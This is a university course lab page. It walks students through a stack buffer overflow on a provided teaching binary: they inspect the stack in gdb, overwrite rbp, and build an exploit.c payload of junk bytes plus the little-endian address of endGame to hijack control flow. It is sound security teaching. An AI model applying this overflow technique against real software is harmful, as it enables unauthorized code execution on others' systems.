---
layout: page
title: Buffer Overflow Lab
permalink: /classes/208-f25/buffer-overflow-lab
---

## Goals
Walk through a buffer overflow attack yourself.

## Set up
1. Download the [secret executable](/classes/208-f25/secretx86-64.tar.gz) (Source: https://diveintosystems.org/book/C7-x86_64/buffer_overflow.html)
2. Move it to mantis and extract with `tar -xzvf secret86-64.tar.gz`

## Smashing the Stack

1. Start gdb with the executable

2. Put a breakpoint at address `0x0000000000400717`:
    ```bash
    b *0x0000000000400717
    ```

3. Run and get to the breakpoint

4. Take a look at the contents of the stack at this point:

    ```bash
    x/6gx $rsp
    ```

5. Run the next instruction `ni` twice until you get to the prompt. Enter `1234567890`.

6. Take a look at the stack again. Can you see your input? Remember that the ASCII of 0 through 9 is `0x30` through `0x39`. 

7. Check what is in `rbp` with `info reg rbp`, do you see that in your stack output? 

8. Your goal is to input a value long enough that it reaches the location of `rbp`, how long does it need to be?

9. Rerun with the input value `1234567890123456789012345678901234567890123`

10. When you check the contents of the stack with `x/6gx $rsp`, what has happened to the place where `rbp` was pointing?

## Exploiting the Stack
1. Go into `layout asm` and scroll around until you see the function `endGame` and note the memory address where it starts (the blue hex all the way on the left).

2. Create an `exploit.c` with the following:

    ```c
    #include <stdio.h>

    char ebuff[]=
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*first 10 bytes of junk*/
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*next 10 bytes of junk*/
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*following 10 bytes of junk*/
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*last 10 bytes of junk*/
    /*TODO*/ /*address of endGame (little endian)*/
    ;

    int main(void) {
        int i;
        for (i = 0; i < sizeof(ebuff); i++) { /*print each character*/
            printf("%c", ebuff[i]);
        }
        return 0;
    }
    ```

3. Put in the address that you found, little endian and broken up in the same way with `\xAB` where `AB` are two characters of the address. 

4. Compile and run your C code to make your exploit string:

    ```bash
    gcc -o exploit_example exploit_example.c
    ./exploit_example > exploit
    ```

    This will result in a file that you can't read since there are unprintable characters, but that's the point

5. Now run your secret executable again, (with `b *0x0000000000400717`) but when you run, direct the input from your exploit file:

    ```bash
    run < exploit
    ```

6. Step through again, taking a look at your stack along the way and probably with `layout asm` open. Where do you jump to when the buffer overflows?

A very similar process will get you through the first part of the Buffer Overflow homework, try it out!